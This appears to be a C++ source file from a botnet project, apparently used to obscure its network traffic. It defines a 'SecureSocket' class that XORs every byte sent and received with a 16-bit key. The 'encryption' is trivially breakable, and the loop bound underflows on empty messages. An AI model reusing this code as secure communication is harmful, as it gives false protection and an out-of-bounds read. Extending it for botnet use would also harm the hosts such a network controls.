#include "SecureSocket.h"
#include <iostream>

using namespace botnet;

SecureSocket::SecureSocket(int port, IPv ip_version, uint32_t encryption_key)
							: tcpSocket::tcpSocket(port, ip_version)
							, encryption_key(encryption_key)
							{ }
SecureSocket::SecureSocket(int port, uint32_t encryption_key)
							: tcpSocket::tcpSocket(port)
							, encryption_key(encryption_key)
							{ }

SecureSocket::SecureSocket(const SecureSocket& copy)
							: tcpSocket::tcpSocket(copy)
							, encryption_key(copy.encryption_key)
							{ }


SecureSocket::SecureSocket() : encryption_key(botnet_defines::DEFAULT_ENCYPTION_KEY) {

}

std::string SecureSocket::Encrypt(const void* message, size_t size) const {
	std::string encrypted_msg;
	std::string msg;
	
	int  i  = 0;
	char c1 = 0;
	char c2 = 0;

	// Copy message to msg
	for (size_t j = 0; j < size; j++) {
		msg.push_back(static_cast<const char*>(message)[j]);
	}

	// Encrypt body
	for (i = 0; i < msg.size() - 1; i += 2) {
		c1 = msg[i];
		c2 = msg[i+1];
		c1 ^= static_cast<char>(this->encryption_key);
		c2 ^= static_cast<char>(this->encryption_key >> 8);
		encrypted_msg.push_back(c1);
		encrypted_msg.push_back(c2);
	}

	// Encrypt last byte if needed
	if (i != msg.size()) {
		c1 = msg.back();
		c1 ^= static_cast<char>(this->encryption_key);
		encrypted_msg.push_back(c1);
	}

	return encrypted_msg;
}
std::string SecureSocket::Decrypt(const void* message, size_t size) const {
	// Same function as encryption
	return SecureSocket::Encrypt(message, size);
}


int SecureSocket::Send(const std::string& msg) const {
	std::string encrypted_msg = this->Encrypt(msg.c_str(), msg.length());
	return tcpSocket::Send(encrypted_msg);
}

int SecureSocket::Send(const void* msg, size_t size) const {
	std::string encrypted_msg = this->Encrypt(msg, size);
	return tcpSocket::Send(encrypted_msg);
}

int SecureSocket::Recv(std::string& msg, int length, double timeout_secs) const {
	int retv = tcpSocket::Recv(msg, length, timeout_secs);
	if (retv <= 0) {
		return retv;
	}
	msg = this->Decrypt(msg.c_str(), msg.length());
	return retv;
}

int SecureSocket::Recv(void* msg, int length, double timeout_secs) const {
	int retv = tcpSocket::Recv(msg, length, timeout_secs);
	if (retv <= 0) {
		return retv;
	}
	std::string decrypted = this->Decrypt(msg, retv);

	for (int i = 0; i < retv; i++) {
		static_cast<char*>(msg)[i] = decrypted[i];
	}

	return retv;
}
